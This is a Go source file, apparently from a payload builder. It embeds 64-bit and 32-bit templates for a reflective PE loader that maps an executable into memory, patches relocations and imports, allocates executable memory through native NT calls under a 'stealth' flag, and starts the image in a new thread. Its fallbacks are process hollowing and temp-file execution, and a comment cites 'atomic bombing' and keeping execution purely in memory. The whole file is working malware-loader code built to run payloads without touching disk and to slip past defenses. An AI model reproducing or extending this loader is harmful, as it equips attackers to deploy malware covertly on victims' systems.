package windows

// SelfInjectionRuntime64 contains the amd64 self-mapping loader used by PE stubs.
const SelfInjectionRuntime64 = `
const (
	selfImageMachineAMD64 = 0x8664
	selfPE32PlusMagic     = 0x20b
)

type selfImage struct {
	Base  uintptr
	Entry uintptr
	Size  uint32
}

var stealthAllocator bool

func executeSelfInjection(payload []byte) {
	img, ok := selfMapImage(payload)
	if !ok {
		executeProcessHollowing(payload)
		return
	}
	selfRunImage(img)
}

func executeNtSyscallReflective(payload []byte) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	prevGC := debug.SetGCPercent(-1)
	defer debug.SetGCPercent(prevGC)
	pinned := append([]byte(nil), payload...)
	stealthAllocator = true
	defer func() { stealthAllocator = false }()
	img, ok := selfMapImage(pinned)
	if !ok {
		executeSelfInjection(payload)
		return
	}
	selfRunImageStealth(img)
	runtime.KeepAlive(pinned)
}

func executeReflectiveLoader(payload []byte) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	prevGC := debug.SetGCPercent(-1)
	defer debug.SetGCPercent(prevGC)
	pinned := append([]byte(nil), payload...)
	stealthAllocator = true
	defer func() { stealthAllocator = false }()
	img, ok := selfMapImage(pinned)
	if !ok {
		executeSelfInjection(payload)
		return
	}
	selfRunImageStealth(img)
	runtime.KeepAlive(pinned)
}

func selfMapImage(payload []byte) (*selfImage, bool) {
	if len(payload) < 0x1000 || payload[0] != 'M' || payload[1] != 'Z' {
		return nil, false
	}
	peOffset := binary.LittleEndian.Uint32(payload[0x3C:])
	if int(peOffset)+4 > len(payload) {
		return nil, false
	}
	if string(payload[peOffset:peOffset+4]) != "PE\x00\x00" {
		return nil, false
	}
	machine := binary.LittleEndian.Uint16(payload[peOffset+4:])
	if machine != selfImageMachineAMD64 {
		return nil, false
	}
	optOffset := peOffset + 24
	if int(optOffset+2) > len(payload) {
		return nil, false
	}
	magic := binary.LittleEndian.Uint16(payload[optOffset:])
	if magic != selfPE32PlusMagic {
		return nil, false
	}
	sizeOfImage := binary.LittleEndian.Uint32(payload[optOffset+56:])
	sizeOfHeaders := binary.LittleEndian.Uint32(payload[optOffset+60:])
	entryRVA := binary.LittleEndian.Uint32(payload[optOffset+16:])
	imageBase := binary.LittleEndian.Uint64(payload[optOffset+24:])
	base := selfVirtualAlloc(uintptr(imageBase), uintptr(sizeOfImage))
	if base == 0 {
		base = selfVirtualAlloc(0, uintptr(sizeOfImage))
		if base == 0 {
			return nil, false
		}
	}

	image := selfBytesFromAddress(base, sizeOfImage)
	copy(image[:sizeOfHeaders], payload[:sizeOfHeaders])
	for i := sizeOfHeaders; i < sizeOfImage; i++ {
		image[i] = 0
	}

	numberOfSections := binary.LittleEndian.Uint16(payload[peOffset+6:])
	optionalSize := binary.LittleEndian.Uint16(payload[peOffset+20:])
	sectionOffset := optOffset + uint32(optionalSize)
	for i := uint16(0); i < numberOfSections; i++ {
		hdr := sectionOffset + uint32(i)*40
		if int(hdr+40) > len(payload) {
			break
		}
		virtualAddress := binary.LittleEndian.Uint32(payload[hdr+12:])
		virtualSize := binary.LittleEndian.Uint32(payload[hdr+8:])
		rawSize := binary.LittleEndian.Uint32(payload[hdr+16:])
		rawPtr := binary.LittleEndian.Uint32(payload[hdr+20:])
		size := virtualSize
		if size < rawSize {
			size = rawSize
		}
		if size == 0 {
			continue
		}
		dst := selfBytesFromAddress(base+uintptr(virtualAddress), size)
		for j := uint32(0); j < size; j++ {
			dst[j] = 0
		}
		if rawSize > 0 && int(rawPtr+rawSize) <= len(payload) {
			copy(dst[:rawSize], payload[rawPtr:rawPtr+rawSize])
		}
	}

	delta := int64(base) - int64(imageBase)
	if delta != 0 {
		if !selfApplyRelocations(base, payload, optOffset, uint64(delta)) {
			return nil, false
		}
	}

	if !selfResolveImports(base, payload, optOffset) {
		return nil, false
	}

	return &selfImage{
		Base:  base,
		Entry: base + uintptr(entryRVA),
		Size:  sizeOfImage,
	}, true
}

func selfRunImage(img *selfImage) {
	thread, _, _ := procCreateThread.Call(0, 0, img.Entry, img.Base, 0, 0)
	if thread != 0 {
		const infiniteWait = 0xFFFFFFFF
		procWaitForSingleObject.Call(thread, infiniteWait)
		procCloseHandle.Call(thread)
	} else {
		syscall.Syscall(img.Entry, 0, 0, 0, 0)
	}
}

func selfRunImageStealth(img *selfImage) {
	var threadHandle uintptr
	status, _, _ := procNtCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&threadHandle)),
		0x1FFFFF,
		0,
		uintptr(^uintptr(0)),
		img.Entry,
		img.Base,
		0,
		0,
		0,
		0,
		0,
	)
	if status != 0 || threadHandle == 0 {
		selfRunImage(img)
		return
	}
	const infiniteWait = 0xFFFFFFFF
	procNtWaitForSingleObject.Call(threadHandle, infiniteWait, 0)
	procNtClose.Call(threadHandle)
}

func selfVirtualAlloc(addr uintptr, size uintptr) uintptr {
	if stealthAllocator {
		return selfNtAllocate(addr, size)
	}
	mem, _, _ := procVirtualAlloc.Call(addr, size, 0x3000, 0x40)
	return mem
}

func selfNtAllocate(addr uintptr, size uintptr) uintptr {
	base := addr
	region := size
	status, _, _ := procNtAllocateVirtualMemory.Call(
		uintptr(^uintptr(0)),
		uintptr(unsafe.Pointer(&base)),
		0,
		uintptr(unsafe.Pointer(&region)),
		uintptr(0x3000),
		uintptr(0x40),
	)
	if status != 0 {
		return 0
	}
	return base
}

func selfBytesFromAddress(addr uintptr, size uint32) []byte {
	if size == 0 {
		return nil
	}
	return unsafe.Slice((*byte)(unsafe.Pointer(addr)), int(size))
}

func selfApplyRelocations(base uintptr, payload []byte, optOffset uint32, delta uint64) bool {
	relocRVA, relocSize := selfDataDirectory(payload, optOffset, 5)
	if relocRVA == 0 || relocSize == 0 {
		return true
	}
	table := selfBytesFromAddress(base+uintptr(relocRVA), relocSize)
	if len(table) == 0 {
		return false
	}
	offset := uint32(0)
	for offset < relocSize {
		if offset+8 > relocSize {
			break
		}
		pageRVA := binary.LittleEndian.Uint32(table[offset:])
		blockSize := binary.LittleEndian.Uint32(table[offset+4:])
		offset += 8
		entries := (blockSize - 8) / 2
		for i := uint32(0); i < entries; i++ {
			if offset+2 > relocSize {
				return false
			}
			entry := binary.LittleEndian.Uint16(table[offset:])
			offset += 2
			typeID := entry >> 12
			rel := pageRVA + uint32(entry&0x0FFF)
			target := base + uintptr(rel)
			switch typeID {
			case 0:
				continue
			case 0xA:
				val := *(*uint64)(unsafe.Pointer(target))
				*(*uint64)(unsafe.Pointer(target)) = val + delta
			case 0x3:
				val := *(*uint32)(unsafe.Pointer(target))
				*(*uint32)(unsafe.Pointer(target)) = val + uint32(delta)
			}
		}
	}
	return true
}

func selfResolveImports(base uintptr, payload []byte, optOffset uint32) bool {
	importRVA, importSize := selfDataDirectory(payload, optOffset, 1)
	if importRVA == 0 || importSize == 0 {
		return true
	}
	descriptors := selfBytesFromAddress(base+uintptr(importRVA), importSize)
	if len(descriptors) == 0 {
		return false
	}
	offset := uint32(0)
	for {
		if offset+20 > importSize {
			break
		}
		origThunk := binary.LittleEndian.Uint32(descriptors[offset:])
		nameRVA := binary.LittleEndian.Uint32(descriptors[offset+12:])
		firstThunk := binary.LittleEndian.Uint32(descriptors[offset+16:])
		if origThunk == 0 && nameRVA == 0 && firstThunk == 0 {
			break
		}
		dllName := selfReadCString(base, nameRVA)
		hModule := selfLoadLibrary(dllName)
		if hModule == 0 {
			return false
		}
		lookup := origThunk
		if lookup == 0 {
			lookup = firstThunk
		}
		thunkPtr := base + uintptr(firstThunk)
		lookupPtr := base + uintptr(lookup)
		for {
			val := *(*uint64)(unsafe.Pointer(lookupPtr))
			if val == 0 {
				break
			}
			var procAddr uintptr
			if val&0x8000000000000000 != 0 {
				ordinal := val & 0xFFFF
				procAddr = selfGetProcAddress(hModule, "", uintptr(ordinal), true)
			} else {
				funcName := selfReadCString(base, uint32(val)+2)
				procAddr = selfGetProcAddress(hModule, funcName, 0, false)
			}
			if procAddr == 0 {
				return false
			}
			*(*uintptr)(unsafe.Pointer(thunkPtr)) = procAddr
			lookupPtr += 8
			thunkPtr += 8
		}
		offset += 20
	}
	return true
}

func selfDataDirectory(payload []byte, optOffset uint32, index int) (uint32, uint32) {
	base := optOffset + 112
	entry := base + uint32(index*8)
	if int(entry+8) > len(payload) {
		return 0, 0
	}
	rva := binary.LittleEndian.Uint32(payload[entry:])
	size := binary.LittleEndian.Uint32(payload[entry+4:])
	return rva, size
}

func selfReadCString(base uintptr, rva uint32) string {
	if rva == 0 {
		return ""
	}
	var buf []byte
	for i := 0; i < 1024; i++ {
		b := *(*byte)(unsafe.Pointer(base + uintptr(rva) + uintptr(i)))
		if b == 0 {
			break
		}
		buf = append(buf, b)
	}
	return string(buf)
}

func selfLoadLibrary(name string) uintptr {
	if name == "" {
		return 0
	}
	ptr, err := syscall.BytePtrFromString(name)
	if err != nil {
		return 0
	}
	h, _, _ := procLoadLibraryA.Call(uintptr(unsafe.Pointer(ptr)))
	return h
}

func selfGetProcAddress(module uintptr, name string, ordinal uintptr, byOrdinal bool) uintptr {
	if module == 0 {
		return 0
	}
	if byOrdinal {
		addr, _, _ := procGetProcAddress.Call(module, ordinal)
		return addr
	}
	ptr, err := syscall.BytePtrFromString(name)
	if err != nil {
		return 0
	}
	addr, _, _ := procGetProcAddress.Call(module, uintptr(unsafe.Pointer(ptr)))
	return addr
}
`

// SelfInjectionRuntime32 contains the 32-bit self-injection implementation. Process hollowing and atomic bombing
// automatically defer to this loader to keep execution purely in memory.
const SelfInjectionRuntime32 = `
const (
	selfImageMachineI386 = 0x014c
	selfPE32Magic        = 0x10b
)

type selfImage32 struct {
	Base  uintptr
	Entry uintptr
	Size  uint32
}

var stealthAllocator32 bool

func executeSelfInjection(payload []byte) {
	img, ok := selfMapImage32(payload)
	if !ok {
		executeFromTemp(payload)
		return
	}
	selfRunImage32(img)
}

func executeNtSyscallReflective(payload []byte) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	prevGC := debug.SetGCPercent(-1)
	defer debug.SetGCPercent(prevGC)
	pinned := append([]byte(nil), payload...)
	stealthAllocator32 = true
	defer func() { stealthAllocator32 = false }()
	img, ok := selfMapImage32(pinned)
	if !ok {
		executeSelfInjection(payload)
		return
	}
	selfRunImageStealth32(img)
	runtime.KeepAlive(pinned)
}

func executeReflectiveLoader(payload []byte) {
	executeSelfInjection(payload)
}

func selfMapImage32(payload []byte) (*selfImage32, bool) {
	if len(payload) < 0x1000 || payload[0] != 'M' || payload[1] != 'Z' {
		return nil, false
	}
	peOffset := binary.LittleEndian.Uint32(payload[0x3C:])
	if int(peOffset)+4 > len(payload) {
		return nil, false
	}
	if string(payload[peOffset:peOffset+4]) != "PE\x00\x00" {
		return nil, false
	}
	machine := binary.LittleEndian.Uint16(payload[peOffset+4:])
	if machine != selfImageMachineI386 {
		return nil, false
	}
	optOffset := peOffset + 24
	if int(optOffset+2) > len(payload) {
		return nil, false
	}
	magic := binary.LittleEndian.Uint16(payload[optOffset:])
	if magic != selfPE32Magic {
		return nil, false
	}
	sizeOfImage := binary.LittleEndian.Uint32(payload[optOffset+56:])
	sizeOfHeaders := binary.LittleEndian.Uint32(payload[optOffset+60:])
	entryRVA := binary.LittleEndian.Uint32(payload[optOffset+16:])
	imageBase := binary.LittleEndian.Uint32(payload[optOffset+28:])

	base := selfVirtualAlloc32(uintptr(imageBase), uintptr(sizeOfImage))
	if base == 0 {
		base = selfVirtualAlloc32(0, uintptr(sizeOfImage))
		if base == 0 {
			return nil, false
		}
	}

	image := selfBytesFromAddress32(base, sizeOfImage)
	copy(image[:sizeOfHeaders], payload[:sizeOfHeaders])
	for i := sizeOfHeaders; i < sizeOfImage; i++ {
		image[i] = 0
	}

	numberOfSections := binary.LittleEndian.Uint16(payload[peOffset+6:])
	optionalSize := binary.LittleEndian.Uint16(payload[peOffset+20:])
	sectionOffset := optOffset + uint32(optionalSize)
	for i := uint16(0); i < numberOfSections; i++ {
		hdr := sectionOffset + uint32(i)*40
		if int(hdr+40) > len(payload) {
			break
		}
		virtualAddress := binary.LittleEndian.Uint32(payload[hdr+12:])
		virtualSize := binary.LittleEndian.Uint32(payload[hdr+8:])
		rawSize := binary.LittleEndian.Uint32(payload[hdr+16:])
		rawPtr := binary.LittleEndian.Uint32(payload[hdr+20:])
		size := virtualSize
		if size < rawSize {
			size = rawSize
		}
		if size == 0 {
			continue
		}
		dst := selfBytesFromAddress32(base+uintptr(virtualAddress), size)
		for j := uint32(0); j < size; j++ {
			dst[j] = 0
		}
		if rawSize > 0 && int(rawPtr+rawSize) <= len(payload) {
			copy(dst[:rawSize], payload[rawPtr:rawPtr+rawSize])
		}
	}

	delta := int64(base) - int64(uintptr(imageBase))
	if delta != 0 {
		if !selfApplyRelocations32(base, payload, optOffset, uint32(delta)) {
			return nil, false
		}
	}

	if !selfResolveImports32(base, payload, optOffset) {
		return nil, false
	}

	return &selfImage32{
		Base:  base,
		Entry: base + uintptr(entryRVA),
		Size:  sizeOfImage,
	}, true
}

func selfRunImage32(img *selfImage32) {
	thread, _, _ := procCreateThread.Call(0, 0, img.Entry, img.Base, 0, 0)
	if thread != 0 {
		const infiniteWait = 0xFFFFFFFF
		procWaitForSingleObject.Call(thread, infiniteWait)
		procCloseHandle.Call(thread)
	} else {
		syscall.Syscall(img.Entry, 0, 0, 0, 0)
	}
}

func selfRunImageStealth32(img *selfImage32) {
	var threadHandle uintptr
	status, _, _ := procNtCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&threadHandle)),
		0x1FFFFF,
		0,
		uintptr(^uintptr(0)),
		img.Entry,
		img.Base,
		0,
		0,
		0,
		0,
		0,
	)
	if status != 0 || threadHandle == 0 {
		selfRunImage32(img)
		return
	}
	const infiniteWait = 0xFFFFFFFF
	procNtWaitForSingleObject.Call(threadHandle, infiniteWait, 0)
	procNtClose.Call(threadHandle)
}

func selfApplyRelocations32(base uintptr, payload []byte, optOffset uint32, delta uint32) bool {
	relocRVA, relocSize := selfDataDirectory32(payload, optOffset, 5)
	if relocRVA == 0 || relocSize == 0 {
		return true
	}
	table := selfBytesFromAddress32(base+uintptr(relocRVA), relocSize)
	if len(table) == 0 {
		return false
	}
	offset := uint32(0)
	for offset < relocSize {
		if offset+8 > relocSize {
			break
		}
		pageRVA := binary.LittleEndian.Uint32(table[offset:])
		blockSize := binary.LittleEndian.Uint32(table[offset+4:])
		offset += 8
		entries := (blockSize - 8) / 2
		for i := uint32(0); i < entries; i++ {
			if offset+2 > relocSize {
				return false
			}
			entry := binary.LittleEndian.Uint16(table[offset:])
			offset += 2
			typeID := entry >> 12
			rel := pageRVA + uint32(entry&0x0FFF)
			target := base + uintptr(rel)
			switch typeID {
			case 0:
				continue
			case 0x3:
				val := *(*uint32)(unsafe.Pointer(target))
				*(*uint32)(unsafe.Pointer(target)) = val + delta
			}
		}
	}
	return true
}

func selfResolveImports32(base uintptr, payload []byte, optOffset uint32) bool {
	importRVA, importSize := selfDataDirectory32(payload, optOffset, 1)
	if importRVA == 0 || importSize == 0 {
		return true
	}
	descriptors := selfBytesFromAddress32(base+uintptr(importRVA), importSize)
	if len(descriptors) == 0 {
		return false
	}
	offset := uint32(0)
	for {
		if offset+20 > importSize {
			break
		}
		origThunk := binary.LittleEndian.Uint32(descriptors[offset:])
		nameRVA := binary.LittleEndian.Uint32(descriptors[offset+12:])
		firstThunk := binary.LittleEndian.Uint32(descriptors[offset+16:])
		if origThunk == 0 && nameRVA == 0 && firstThunk == 0 {
			break
		}
		dllName := selfReadCString32(base, nameRVA)
		hModule := selfLoadLibrary32(dllName)
		if hModule == 0 {
			return false
		}
		lookup := origThunk
		if lookup == 0 {
			lookup = firstThunk
		}
		thunkPtr := base + uintptr(firstThunk)
		lookupPtr := base + uintptr(lookup)
		for {
			val := *(*uint32)(unsafe.Pointer(lookupPtr))
			if val == 0 {
				break
			}
			var procAddr uintptr
			if val&0x80000000 != 0 {
				ordinal := uintptr(val & 0xFFFF)
				procAddr = selfGetProcAddress32(hModule, "", ordinal, true)
			} else {
				funcName := selfReadCString32(base, val+2)
				procAddr = selfGetProcAddress32(hModule, funcName, 0, false)
			}
			if procAddr == 0 {
				return false
			}
			*(*uintptr)(unsafe.Pointer(thunkPtr)) = procAddr
			lookupPtr += 4
			thunkPtr += 4
		}
		offset += 20
	}
	return true
}

func selfVirtualAlloc32(addr uintptr, size uintptr) uintptr {
	if stealthAllocator32 {
		return selfNtAllocate32(addr, size)
	}
	mem, _, _ := procVirtualAlloc.Call(addr, size, 0x3000, 0x40)
	return mem
}

func selfNtAllocate32(addr uintptr, size uintptr) uintptr {
	base := addr
	region := size
	status, _, _ := procNtAllocateVirtualMemory.Call(
		uintptr(^uintptr(0)),
		uintptr(unsafe.Pointer(&base)),
		0,
		uintptr(unsafe.Pointer(&region)),
		uintptr(0x3000),
		uintptr(0x40),
	)
	if status != 0 {
		return 0
	}
	return base
}

func selfBytesFromAddress32(addr uintptr, size uint32) []byte {
	if size == 0 {
		return nil
	}
	return unsafe.Slice((*byte)(unsafe.Pointer(addr)), int(size))
}

func selfDataDirectory32(payload []byte, optOffset uint32, index int) (uint32, uint32) {
	base := optOffset + 96
	entry := base + uint32(index*8)
	if int(entry+8) > len(payload) {
		return 0, 0
	}
	rva := binary.LittleEndian.Uint32(payload[entry:])
	size := binary.LittleEndian.Uint32(payload[entry+4:])
	return rva, size
}

func selfReadCString32(base uintptr, rva uint32) string {
	if rva == 0 {
		return ""
	}
	var buf []byte
	for i := 0; i < 1024; i++ {
		b := *(*byte)(unsafe.Pointer(base + uintptr(rva) + uintptr(i)))
		if b == 0 {
			break
		}
		buf = append(buf, b)
	}
	return string(buf)
}

func selfLoadLibrary32(name string) uintptr {
	if name == "" {
		return 0
	}
	ptr, err := syscall.BytePtrFromString(name)
	if err != nil {
		return 0
	}
	h, _, _ := procLoadLibraryA.Call(uintptr(unsafe.Pointer(ptr)))
	return h
}

func selfGetProcAddress32(module uintptr, name string, ordinal uintptr, byOrdinal bool) uintptr {
	if module == 0 {
		return 0
	}
	if byOrdinal {
		addr, _, _ := procGetProcAddress.Call(module, ordinal)
		return addr
	}
	ptr, err := syscall.BytePtrFromString(name)
	if err != nil {
		return 0
	}
	addr, _, _ := procGetProcAddress.Call(module, uintptr(unsafe.Pointer(ptr)))
	return addr
}
`
